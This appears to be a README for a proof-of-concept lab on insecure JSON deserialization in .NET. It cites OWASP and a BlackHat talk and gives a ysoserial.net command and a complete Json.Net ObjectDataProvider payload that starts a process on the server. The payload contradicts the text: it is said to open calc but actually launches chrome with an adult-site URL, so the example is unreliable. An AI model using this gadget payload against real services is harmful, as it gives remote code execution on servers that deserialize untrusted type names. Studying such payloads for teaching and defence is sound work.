# insecure-deserialization-net-poc
Insecure deserialization is a severe issue, which allows an attacker to exploit a server just by sending a malicious JSON.
This is a new issue in the [OWASP Top 10 2017 release](https://github.com/OWASP/Top10) - A8.
This POC is built based on a [white paper](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf) from BlackHat USA 2017 talk.
You can find a recording of the talk [here](https://www.youtube.com/watch?v=NqHsaVhlxAQ) - this recording is from AppSec USA 2017.

## Running
* Use VS to open the solution and launch the server.
* Use curl/postman to send malicious request to the API.

## Example payload
This is an example payload, as generated by [ysoserial.net](https://github.com/pwntester/ysoserial.net).
To generate it, I used the following command: `ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc"`:
```
{
    "body": {
        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
        "MethodName": "Start",
        "MethodParameters": {
            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "$values": [
                "chrome",
                "/c https://www.pornhub.com/view_video.php?viewkey=ph5a74ee77d1c7b"
            ]
        },
        "ObjectInstance": {
            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
        }
    }
}
```
Post this payload to `http://localhost:8085/api/hello`. 
A new `calc` instance should be open.
